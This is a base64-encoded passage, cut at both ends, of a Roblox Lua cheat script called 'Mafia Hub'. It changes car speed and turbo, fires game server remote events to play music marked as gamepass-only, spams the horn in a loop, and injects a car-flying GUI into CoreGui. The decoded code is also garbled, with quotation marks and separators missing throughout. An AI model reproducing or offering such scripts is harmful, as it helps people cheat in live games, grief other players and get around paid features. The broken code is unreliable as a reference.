aWxkKEJvZHkpLlZlaGljbGVTZWF0CiAgICAgICAgaWYgYm9keSB0aGVuCiAgICAgICAgICAgIGJvZHkuVG9wU3BlZWQuVmFsdWUgPSBzcGVlZFZhbHVlCiAgICAgICAgICAgIGJvZHkuVHVyYm8uVmFsdWUgPSB0dXJib1ZhbHVlCiAgICAgICAgICAgIHdhaXQoMC4xKQogICAgICAgICAgICBMaWJhcnlNYWtlTm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgIE5hbWUgPSBNYWZpYSBIdWIsCiAgICAgICAgICAgICAgICBDb250ZW50ID0gRG9uZSwgWW91IGNhbiBNb3ZlIE5vdyEsCiAgICAgICAgICAgICAgICBUaW1lID0gNQogICAgICAgICAgICB9KQogICAgICAgIGVsc2UKICAgICAgICAgICAgTGliYXJ5TWFrZU5vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICBOYW1lID0gRXJyb3IsCiAgICAgICAgICAgICAgICBDb250ZW50ID0gU2l0IGluIGNhciBmaXJzdCEsCiAgICAgICAgICAgICAgICBUaW1lID0gNQogICAgICAgICAgICB9KQogICAgICAgIGVuZAogICAgZWxzZQogICAgICAgIExpYmFyeU1ha2VOb3RpZmljYXRpb24oewogICAgICAgICAgICBOYW1lID0gRXJyb3IsCiAgICAgICAgICAgIENvbnRlbnQgPSBQdXQgYSBDYXIgRmlyc3QhLAogICAgICAgICAgICBUaW1lID0gNQogICAgICAgIH0pCiAgICBlbmQKZW5kCgpDYXJUYWJBZGRUZXh0Qm94KHsKICAgIE5hbWUgPSBTcGVlZCwKICAgIFBsYWNlaG9sZGVyVGV4dCA9IDUwLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBsb2NhbCBuZXdTcGVlZCA9IHRvbnVtYmVyKHZhbHVlKQogICAgICAgIGlmIG5ld1NwZWVkIHRoZW4KICAgICAgICAgICAgU3BlZWQgPSBuZXdTcGVlZAogICAgICAgIGVuZAogICAgZW5kCn0pCgpDYXJUYWJBZGRUZXh0Qm94KHsKICAgIE5hbWUgPSBUdXJibywKICAgIFBsYWNlaG9sZGVyVGV4dCA9IDUwLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBsb2NhbCBuZXdUdXJibyA9IHRvbnVtYmVyKHZhbHVlKQogICAgICAgIGlmIG5ld1R1cmJvIHRoZW4KICAgICAgICAgICAgVHVyYm8gPSBuZXdUdXJibwogICAgICAgIGVuZAogICAgZW5kCn0pCgpDYXJUYWJBZGRUZXh0Qm94KHsKICAgIE5hbWUgPSBEcmlmdCwKICAgIFBsYWNlaG9sZGVyVGV4dCA9IDUwLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICBbMV0gPSBEcmlmdGluZ051bWJlciwKICAgICAgICAgICAgWzJdID0gdmFsdWUKICAgICAgICB9CiAgICAgICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMVBsYXllcjFzQ2ExcilGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIGVuZAp9KQoKQ2FyVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBBcHBseSBTcGVlZCwgVHVyYm8gYW5kIERyaWZ0LAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgQ2hhbmdlQ2FyU3BlZWRBbmRUdXJibyhTcGVlZCwgVHVyYm8pCiAgICBlbmQKfSkKCi0tIFR1cmJvIFYyIFNlY3Rpb24KbG9jYWwgVHVyYm9TZWN0aW9uID0gQ2FyVGFiQWRkU2VjdGlvbih7VHVyYm8gVjJ9KQoKQ2FyVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBUdXJibyBWMiBbQmVzdF0sCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWRXYWl0KCkKbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCgpsb2NhbCBmbHlpbmcgPSBmYWxzZQpsb2NhbCBzcGVlZCA9IDMwCgpsb2NhbCBzY3JlZW5HdWkgPSBJbnN0YW5jZS5uZXcoU2NyZWVuR3VpLCBwbGF5ZXIuUGxheWVyR3VpKQoKbG9jYWwgZnVuY3Rpb24gY3JlYXRlSW1hZ2VCdXR0b24obmFtZSwgcG9zaXRpb24sIGltYWdlSWQsIHJvdGF0aW9uLCBhY3Rpb24pCiAgICBsb2NhbCBidXR0b24gPSBJbnN0YW5jZS5uZXcoSW1hZ2VCdXR0b24sIHNjcmVlbkd1aSkKICAgIGJ1dHRvbi5TaXplID0gVURpbTIubmV3KDAsIDYwLCAwLCA2MCkKICAgIGJ1dHRvbi5Qb3NpdGlvbiA9IHBvc2l0aW9uCiAgICBidXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIGJ1dHRvbi5JbWFnZSA9IHJieGFzc2V0aWQgLi4gaW1hZ2VJZAogICAgYnV0dG9uLlJvdGF0aW9uID0gcm90YXRpb24KICAgIGJ1dHRvbi5Nb3VzZUJ1dHRvbjFEb3duQ29ubmVjdChhY3Rpb24pCiAgICByZXR1cm4gYnV0dG9uCmVuZAoKbG9jYWwgZm9yd2FyZEJ1dHRvbiA9IGNyZWF0ZUltYWdlQnV0dG9uKEZvcndhcmRCdXR0b24sIFVEaW0yLm5ldygwLCAxMCwgMC4zNSwgMCksIDE4NDc4MjQ5NjA2LCAwLCBmdW5jdGlvbigpCiAgICBmbHlpbmcgPSB0cnVlCiAgICB3aGlsZSBmbHlpbmcgZG8KICAgICAgICBpZiBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5WZWxvY2l0eSA9IGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lLkxvb2tWZWN0b3IgIHNwZWVkCiAgICAgICAgZW5kCiAgICAgICAgdGFzay53YWl0KCkKICAgIGVuZAplbmQpCgpsb2NhbCBiYWNrQnV0dG9uID0gY3JlYXRlSW1hZ2VCdXR0b24oQmFja0J1dHRvbiwgVURpbTIubmV3KDAsIDEwLCAwLjUsIDApLCAxODQ3ODI0OTYwNiwgMTgwLCBmdW5jdGlvbigpCiAgICBmbHlpbmcgPSB0cnVlCiAgICB3aGlsZSBmbHlpbmcgZG8KICAgICAgICBpZiBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5WZWxvY2l0eSA9IC1odW1hbm9pZFJvb3RQYXJ0LkNGcmFtZS5Mb29rVmVjdG9yICBzcGVlZAogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgpCiAgICBlbmQKZW5kKQoKbG9jYWwgbGVmdEJ1dHRvbiA9IGNyZWF0ZUltYWdlQnV0dG9uKExlZnRCdXR0b24sIFVEaW0yLm5ldygxLCAtMjEwLCAwLjMsIDApLCAxODQ3ODI0OTYwNiwgLTkwLCBmdW5jdGlvbigpCiAgICBmbHlpbmcgPSB0cnVlCiAgICB3aGlsZSBmbHlpbmcgZG8KICAgICAgICBpZiBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5WZWxvY2l0eSA9IC1odW1hbm9pZFJvb3RQYXJ0LkNGcmFtZS5SaWdodFZlY3RvciAgc3BlZWQKICAgICAgICBlbmQKICAgICAgICB0YXNrLndhaXQoKQogICAgZW5kCmVuZCkKCmxvY2FsIHJpZ2h0QnV0dG9uID0gY3JlYXRlSW1hZ2VCdXR0b24oUmlnaHRCdXR0b24sIFVEaW0yLm5ldygxLCAtMTQwLCAwLjMsIDApLCAxODQ3ODI0OTYwNiwgOTAsIGZ1bmN0aW9uKCkKICAgIGZseWluZyA9IHRydWUKICAgIHdoaWxlIGZseWluZyBkbwogICAgICAgIGlmIGh1bWFub2lkUm9vdFBhcnQgdGhlbgogICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5ID0gaHVtYW5vaWRSb290UGFydC5DRnJhbWUuUmlnaHRWZWN0b3IgIHNwZWVkCiAgICAgICAgZW5kCiAgICAgICAgdGFzay53YWl0KCkKICAgIGVuZAplbmQpCgpsb2NhbCBmdW5jdGlvbiBzdG9wRmx5aW5nKCkKICAgIGZseWluZyA9IGZhbHNlCiAgICBpZiBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgIGVuZAplbmQKCmZvcndhcmRCdXR0b24uTW91c2VCdXR0b24xVXBDb25uZWN0KHN0b3BGbHlpbmcpCmJhY2tCdXR0b24uTW91c2VCdXR0b24xVXBDb25uZWN0KHN0b3BGbHlpbmcpCmxlZnRCdXR0b24uTW91c2VCdXR0b24xVXBDb25uZWN0KHN0b3BGbHlpbmcpCnJpZ2h0QnV0dG9uLk1vdXNlQnV0dG9uMVVwQ29ubmVjdChzdG9wRmx5aW5nKQoKbG9jYWwgdHVyYm9CdXR0b24gPSBJbnN0YW5jZS5uZXcoSW1hZ2VCdXR0b24sIHNjcmVlbkd1aSkKdHVyYm9CdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCA2MCwgMCwgNjApCnR1cmJvQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIC0xMzAsIDAsIDEwKQp0dXJib0J1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQp0dXJib0J1dHRvbi5JbWFnZSA9IHJieGFzc2V0aWQ5NzYwNzU3OTM4NjQxOAp0dXJib0J1dHRvbi5Nb3VzZUJ1dHRvbjFEb3duQ29ubmVjdChmdW5jdGlvbigpCiAgICBzcGVlZCA9IDMwMAplbmQpCgotLSBNaW5pbWl6ZSBidXR0b24gKHdpdGggKyBvciAtIGRlcGVuZGluZyBvbiB0aGUgc3RhdGUpCmxvY2FsIG1pbmltaXplQnV0dG9uID0gSW5zdGFuY2UubmV3KFRleHRCdXR0b24sIHNjcmVlbkd1aSkKbWluaW1pemVCdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCA2MCwgMCwgNjApCm1pbmltaXplQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCAxMCkgIC0tIENoYW5nZWQgdG8gdG9wLWxlZnQgY29ybmVyCm1pbmltaXplQnV0dG9uLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCm1pbmltaXplQnV0dG9uLlRleHQgPSAtICAtLSBTdGFydHMgd2l0aCAtIHN5bWJvbAptaW5pbWl6ZUJ1dHRvbi5UZXh0U2l6ZSA9IDQwCm1pbmltaXplQnV0dG9uLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQoKbG9jYWwgYnV0dG9ucyA9IHtmb3J3YXJkQnV0dG9uLCBiYWNrQnV0dG9uLCBsZWZ0QnV0dG9uLCByaWdodEJ1dHRvbiwgdHVyYm9CdXR0b259Cgpsb2NhbCBtaW5pbWl6ZWQgPSBmYWxzZQoKbG9jYWwgZnVuY3Rpb24gdG9nZ2xlQnV0dG9ucygpCiAgICBtaW5pbWl6ZWQgPSBub3QgbWluaW1pemVkCiAgICBmb3IgXywgYnV0dG9uIGluIGlwYWlycyhidXR0b25zKSBkbwogICAgICAgIGJ1dHRvbi5WaXNpYmxlID0gbm90IG1pbmltaXplZAogICAgZW5kCiAgICAtLSBDaGFuZ2UgdGhlIHRleHQgb2YgdGhlIG1pbmltaXplIGJ1dHRvbgogICAgaWYgbWluaW1pemVkIHRoZW4KICAgICAgICBtaW5pbWl6ZUJ1dHRvbi5UZXh0ID0gKwogICAgZWxzZQogICAgICAgIG1pbmltaXplQnV0dG9uLlRleHQgPSAtCiAgICBlbmQKZW5kCgptaW5pbWl6ZUJ1dHRvbi5Nb3VzZUJ1dHRvbjFEb3duQ29ubmVjdCh0b2dnbGVCdXR0b25zKSAgICAKICAgIGVuZAp9KQoKQ2FyVGFiQWRkUGFyYWdyYXBoKHtJbmZvcm1hdGlvbiwgQm90aCB0dXJib3MgZG8gbm90IHJlcXVpcmUgYSBHYW1lcGFzc30pCgotLSBNdXNpYyBTZWN0aW9uCmxvY2FsIE11c2ljU2VjdGlvbiA9IENhclRhYkFkZFNlY3Rpb24oe011c2ljIGZvciBDYXJzLCBIb3VzZXN9KQoKbG9jYWwgbXVzaWNJZHMgPSB7CiAgICA3MTM3MzU2MjI0Mzc1MiwgMTM4MTI5MDE5ODU4MjQ0LCAxMzg0ODAzNzIzNTc1MjYsIDEyMjE5OTkzMzg3ODY3MCwKICAgIDc0MTg3MTgxOTA2NzA3LCA4Mjc5MzkxNjU3MzAzMSwgMTA3NDIxNzYxOTU4NzkwLCA5MTM5NDA5MjYwMzQ0MCwKICAgIDExMzE5ODk1Nzk3MzQyMSwgODE0NTIzMTU5OTE1MjcsIDkzNzg2MDYwMTc0NzkwLCA3NDc1MjA4OTA2OTQ3NiwKICAgIDEzMTU5MjIzNTc2Mjc4OSwgMTMyMDgxNzc0NTA3NDk1LCAxMjQzOTQyOTM5NTA3NjMsIDgzMzgxNjQ3NjQ2MzUwLAogICAgMTYxOTA3ODIxODEsIDE4NDE2ODI2MzcsIDMxNDgzMjk2MzgsIDEyNDkyODM2NzczMzM5NSwKICAgIDEwNjMxNzE4NDY0NDM5NCwgMTAwMjQ3MDU1MTE0NTA0LCAxMDcwMzU2MzgwMDUyMzMsIDEwOTM1MTY0OTcxNjkwMCwKICAgIDg0NzUxMzk4NTE3MDgzLCAxMjUyNTk5NjkxNzQ0NDksIDg5MjY5MDcxODI5MzMyLCA4ODA5NDQ3OTM5OTQ4OSwKICAgIDcyNDQwMjMyNTEzMzQxLCA5Mjg5MzM1OTIyNjQ1NCwgMTExMjgxNzEwNDQ1MDE4LCA5ODY3NzUxNTUwNjAwNiwKICAgIDEwNTg4MjgzMzM3NDA2MSwgMTA0NTQxMjkyNDQzMTMzLCAxMDU4MzIxNTQ0NDQ0OTQsIDg0NzMzNzM2MDQ4MTQyLAogICAgOTQ3MTg0NzM4MzA2NDAsIDEzMDMyNDgyNjk0MzcxOCwgMTIzMDM5MDI3NTc3NzM1LCAxMTMzMTI3ODU1MTI3MDIsCiAgICAxMzkxNjEyMDU5NzA2MzcsIDExMzc2ODk0NDg0OTA5MywgMTM1NjY3OTAzMjUzNTY2LCA4MTMzNTM5MjAwMjU4MCwKICAgIDc3NDI4MDkxMTY1MjExLCAxNDE0NTYyNDAzMSwgODA4MDI1NTYxOCwgODY1NDgzNTQ3NCwKICAgIDEzNTMwNDM5NTAyLCAxODg0MTg5NDI3MiwgOTAzMjM0MDc4NDI5MzUsIDEzNjkzMjE5MzMzMTc3NCwKICAgIDExMzUwNDg2MzQ5NTM4NCwgMTgzNjE3NTAzMCwgNzk5OTg5NDkzNjI1MzksIDEwOTE4ODYxMDAyMzI4NywKICAgIDEzNDkzOTg1NzA5NDk1NiwgMTMyMjQ1NjI2MDM4NTEwLCAxMjQ1Njc4MDkyNzc0MDgsIDcyNTkxMzM0NDk4NzE2LAogICAgNzY1Nzg4MTc4NDg1MDQsIDE3NDIyMTU2NjI3LCA4MTkwMjkwOTMwMjI4NSwgMTMwNDQ5NTYxNDYxMDA2LAogICAgMTEwNTE5MjM0ODM4MDI2LCAxMDY0MzQyOTU5NjA1MzUsIDg2MjcxMTIzOTI0MTY4LCA4NTQ4MTk0OTczMjgyOCwKICAgIDEwNjQ3NjE2NjY3MjU4OSwgODc5Njg1MzEyNjI3NDcsIDczOTY2MzY3NTI0MjE2LCAxMzc5NjI0NTQ0ODM1NDIsCiAgICA5ODM3MTc3MTA1NTQxMSwgMTExNjY4MDk3MDUyOTY2LCAxNDAwOTU4ODIzODM5OTEsIDEyMjg3Mzg3NDczODIyMywKICAgIDEwNTQ2MTYxNTU0Mjc5NAp9Cgpsb2NhbCBmdW5jdGlvbiBwbGF5Q2FyTXVzaWMobXVzaWNJZCkKICAgIGlmIG11c2ljSWQgYW5kIG11c2ljSWQgfj0gIHRoZW4KICAgICAgICBsb2NhbCBjYXJBcmdzID0gewogICAgICAgICAgICBbMV0gPSBQaWNraW5nQ2FyTXVzaWNUZXh0LAogICAgICAgICAgICBbMl0gPSBtdXNpY0lkCiAgICAgICAgfQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFQbGF5ZXIxc0NhMXIpRmlyZVNlcnZlcih1bnBhY2soY2FyQXJncykpCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBwbGF5U2Nvb3Rlck11c2ljKG11c2ljSWQpCiAgICBpZiBtdXNpY0lkIGFuZCBtdXNpY0lkIH49ICB0aGVuCiAgICAgICAgbG9jYWwgc2Nvb3RlckFyZ3MgPSB7CiAgICAgICAgICAgIFsxXSA9IFBpY2tpbmdTY29vdGVyTXVzaWNUZXh0LAogICAgICAgICAgICBbMl0gPSBtdXNpY0lkCiAgICAgICAgfQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKVdhaXRGb3JDaGlsZChSRSlXYWl0Rm9yQ2hpbGQoMU5vTW90bzFyVmVoaWNsZTFzKUZpcmVTZXJ2ZXIodW5wYWNrKHNjb290ZXJBcmdzKSkKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIHBsYXlIb3VzZU11c2ljKG11c2ljSWQpCiAgICBpZiBtdXNpY0lkIGFuZCBtdXNpY0lkIH49ICB0aGVuCiAgICAgICAgbG9jYWwgaG91c2VBcmdzID0gewogICAgICAgICAgICBbMV0gPSBQaWNrSG91c2VNdXNpY1RleHQsCiAgICAgICAgICAgIFsyXSA9IG11c2ljSWQKICAgICAgICB9CiAgICAgICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpV2FpdEZvckNoaWxkKFJFKVdhaXRGb3JDaGlsZCgxUGxheWVyMXNIb3VzMWUpRmlyZVNlcnZlcih1bnBhY2soaG91c2VBcmdzKSkKICAgIGVuZAplbmQKCkNhclRhYkFkZFRleHRCb3goewogICAgTmFtZSA9IE11c2ljIElEIChHYW1lcGFzcyBSZXF1aXJlZCksCiAgICBQbGFjZWhvbGRlclRleHQgPSBFbnRlciBNdXNpYyBJRCwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgcGxheUNhck11c2ljKHZhbHVlKQogICAgICAgIHBsYXlTY29vdGVyTXVzaWModmFsdWUpCiAgICAgICAgcGxheUhvdXNlTXVzaWModmFsdWUpCiAgICBlbmQKfSkKCkNhclRhYkFkZERyb3Bkb3duKHsKICAgIE5hbWUgPSBTZWxlY3QgTXVzaWMgKEdhbWVwYXNzIFJlcXVpcmVkKSwKICAgIE9wdGlvbnMgPSBtdXNpY0lkcywKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgcGxheUNhck11c2ljKHZhbHVlKQogICAgICAgIHBsYXlTY29vdGVyTXVzaWModmFsdWUpCiAgICAgICAgcGxheUhvdXNlTXVzaWModmFsdWUpCiAgICBlbmQKfSkKCkNhclRhYkFkZFBhcmFncmFwaCh7Tm90ZSwgVGhlIG11c2ljIHNjcmlwdCB3b3JrcyBpbiBhbGwgY2FycyBhbmQgaG91c2VzfSkKCi0tIENhciBSR0IgU2VjdGlvbgpsb2NhbCBSR0JTZWN0aW9uID0gQ2FyVGFiQWRkU2VjdGlvbih7Q2FyIFJHQn0pCgpDYXJUYWJBZGRUb2dnbGUoewogICAgTmFtZSA9IENhciBSR0IsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGlzQ29sb3JDaGFuZ2luZyA9IHN0YXRlCiAgICAgICAgaWYgaXNDb2xvckNoYW5naW5nIHRoZW4KICAgICAgICAgICAgY29sb3JDaGFuZ2VDb3JvdXRpbmUgPSBjb3JvdXRpbmUuY3JlYXRlKGNoYW5nZUNhckNvbG9yKQogICAgICAgICAgICBjb3JvdXRpbmUucmVzdW1lKGNvbG9yQ2hhbmdlQ29yb3V0aW5lKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpDYXJUYWJBZGRQYXJhZ3JhcGgoe05vdGUsIEFjdGl2YXRpbmcgdGhpcyB3aWxsIG1ha2UgeW91ciBjYXIgUkdCfSkKCi0tIFNwYW0gSG9ybiBTZWN0aW9uCmxvY2FsIEhvcm5TZWN0aW9uID0gQ2FyVGFiQWRkU2VjdGlvbih7U3BhbSBIb3JufSkKCmxvY2FsIHNwYW1taW5nID0gZmFsc2UKbG9jYWwgYXJncyA9IHtIb3JufQoKbG9jYWwgZnVuY3Rpb24gc3BhbUhvcm4oKQogICAgd2hpbGUgc3BhbW1pbmcgZG8KICAgICAgICByZW1vdGVFdmVudEZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIHdhaXQoMC4xKQogICAgZW5kCmVuZAoKQ2FyVGFiQWRkVG9nZ2xlKHsKICAgIE5hbWUgPSBTcGFtIEhvcm4sCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIHNwYW1taW5nID0gdmFsdWUKICAgICAgICBpZiBzcGFtbWluZyB0aGVuCiAgICAgICAgICAgIHNwYXduKHNwYW1Ib3JuKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBGbHkgQ2FyIFNlY3Rpb24KbG9jYWwgRmx5U2VjdGlvbiA9IENhclRhYkFkZFNlY3Rpb24oe0ZseSBDYXJ9KQoKQ2FyVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBGbHkgQ2FyLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgLS1ieSBMdXNjYWEKLS0gVmVyc2lvbiA0LjEKCi0tIEluc3RhbmNlcwpsb2NhbCBGbHltZ3VpdjIgPSBJbnN0YW5jZS5uZXcoU2NyZWVuR3VpKQpsb2NhbCBEcmFnID0gSW5zdGFuY2UubmV3KEZyYW1lKQpsb2NhbCBGbHlGcmFtZSA9IEluc3RhbmNlLm5ldyhGcmFtZSkKbG9jYWwgZGRuc2ZiZndld2VmZSA9IEluc3RhbmNlLm5ldyhUZXh0QnV0dG9uKQpsb2NhbCBTcGVlZCA9IEluc3RhbmNlLm5ldyhUZXh0Qm94KQpsb2NhbCBGbHkgPSBJbnN0YW5jZS5uZXcoVGV4dEJ1dHRvbikKbG9jYWwgU3BlZWVkID0gSW5zdGFuY2UubmV3KFRleHRMYWJlbCkKbG9jYWwgU3RhdCA9IEluc3RhbmNlLm5ldyhUZXh0TGFiZWwpCmxvY2FsIFN0YXQyID0gSW5zdGFuY2UubmV3KFRleHRMYWJlbCkKbG9jYWwgVW5mbHkgPSBJbnN0YW5jZS5uZXcoVGV4dEJ1dHRvbikKbG9jYWwgVmZseSA9IEluc3RhbmNlLm5ldyhUZXh0TGFiZWwpCmxvY2FsIENsb3NlID0gSW5zdGFuY2UubmV3KFRleHRCdXR0b24pCmxvY2FsIE1pbmltaXplID0gSW5zdGFuY2UubmV3KFRleHRCdXR0b24pCmxvY2FsIEZseW9uID0gSW5zdGFuY2UubmV3KEZyYW1lKQpsb2NhbCBXID0gSW5zdGFuY2UubmV3KFRleHRCdXR0b24pCmxvY2FsIFMgPSBJbnN0YW5jZS5uZXcoVGV4dEJ1dHRvbikKCi0tUHJvcGVydGllcwoKRmx5bWd1aXYyLk5hbWUgPSBDYXIgRmx5IGd1aSB2MgpGbHltZ3VpdjIuUGFyZW50ID0gZ2FtZS5Db3JlR3VpCkZseW1ndWl2Mi5aSW5kZXhCZWhhdmlvciA9IEVudW0uWkluZGV4QmVoYXZpb3IuU2libGluZwoKRHJhZy5OYW1lID0gRHJhZwpEcmFnLlBhcmVudCA9IEZseW1ndWl2MgpEcmFnLkFjdGl2ZSA9IHRydWUKRHJhZy5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMTUwLCAxOTEpCkRyYWcuQm9yZGVyU2l6ZVBpeGVsID0gMApEcmFnLkRyYWdnYWJsZSA9IHRydWUKRHJhZy5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjQ4MjQzODQxNSwgMCwgMC40NTQ4NzQ5OTIsIDApCkRyYWcuU2l6ZSA9IFVEaW0yLm5ldygwLCAyMzcsIDAsIDI3KQoKRmx5RnJhbWUuTmFtZSA9IEZseUZyYW1lCkZseUZyYW1lLlBhcmVudCA9IERyYWcKRmx5RnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDgwLCA4MCwgODApCkZseUZyYW1lLkJvcmRlclNpemVQaXhlbCA9IDAKRmx5RnJhbWUuRHJhZ2dhYmxlID0gdHJ1ZQpGbHlGcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygtMC4wMDIwMDAwMDAwOSwgMCwgMC45ODkwMDAwMjIsIDApCkZseUZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMjM3LCAwLCAxMzkpCgpkZG5zZmJmd2V3ZWZlLk5hbWUgPSBkZG5zZmJmd2V3ZWZlCmRkbnNmYmZ3ZXdlZmUuUGFyZW50ID0gRmx5RnJhbWUKZGRuc2ZiZndld2VmZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMTUwLCAxOTEpCmRkbnNmYmZ3ZXdlZmUuQm9yZGVyU2l6ZVBpeGVsID0gMApkZG5zZmJmd2V3ZWZlLlBvc2l0aW9uID0gVURpbTIubmV3KC0wLjAwMDIxMDk2ODc3OCwgMCwgLTAuMDAzOTU2Nzk0NzQsIDApCmRkbnNmYmZ3ZXdlZmUuU2l6ZSA9IFVEaW0yLm5ldygwLCAyMzcsIDAsIDI3KQpkZG5zZmJmd2V3ZWZlLkZvbnQgPSBFbnVtLkZvbnQuU291cmNlU2FucwpkZG5zZmJmd2V3ZWZlLlRleHQgPSBieSBMdXNxdWluaGFfMDY3CmRkbnNmYmZ3ZXdlZmUuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCmRkbnNmYmZ3ZXdlZmUuVGV4dFNjYWxlZCA9IHRydWUKZGRuc2ZiZndld2VmZS5UZXh0U2l6ZSA9IDE0LjAwMApkZG5zZmJmd2V3ZWZlLlRleHRXcmFwcGVkID0gdHJ1ZQoKU3BlZWQuTmFtZSA9IFNwZWVkClNwZWVkLlBhcmVudCA9IEZseUZyYW1lClNwZWVkLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig2MywgNjMsIDYzKQpTcGVlZC5Cb3JkZXJDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAxOTEpClNwZWVkLkJvcmRlclNpemVQaXhlbCA9IDAKU3BlZWQuUG9zaXRpb24gPSBVRGltMi5uZXcoMC40NDUwMjU4NjEsIDAsIDAuNDAyODc3Njg4LCAwKQpTcGVlZC5TaXplID0gVURpbTIubmV3KDAsIDExMSwgMCwgMzMpClNwZWVkLkZvbnQgPSBFbnVtLkZvbnQuU291cmNlU2FucwpTcGVlZC5QbGFjZWhvbGRlckNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClNwZWVkLlRleHQgPSA1MApTcGVlZC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKU3BlZWQuVGV4dFNjYWxlZCA9IHRydWUKU3BlZWQuVGV4dFNpemUgPSAxNC4wMDAKU3BlZWQuVGV4dFdyYXBwZWQgPSB0cnVlCgpGbHkuTmFtZSA9IEZseQpGbHkuUGFyZW50ID0gRmx5RnJhbWUKRmx5LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDE5MSkKRmx5LkJvcmRlclNpemVQaXhlbCA9IDAKRmx5LlBvc2l0aW9uID0gVURpbTIubmV3KDAuMDc1OTQ5MzYzNCwgMCwgMC43MDU3OTcwNzYsIDApCkZseS5TaXplID0gVURpbTIubmV3KDAsIDE5OSwgMCwgMzIpCkZseS5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKRmx5LlRleHQgPSBFbmFibGUKRmx5LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpGbHkuVGV4dFNjYWxlZCA9IHRydWUKRmx5LlRleHRTaXplID0gMTQuMDAwCkZseS5UZXh0V3JhcHBlZCA9IHRydWUKRmx5Lk1vdXNlQnV0dG9uMUNsaWNrQ29ubmVjdChmdW5jdGlvbigpCglsb2NhbCBIdW1hbm9pZFJQID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CglGbHkuVmlzaWJsZSA9IGZhbHNlCglTdGF0Mi5UZXh0I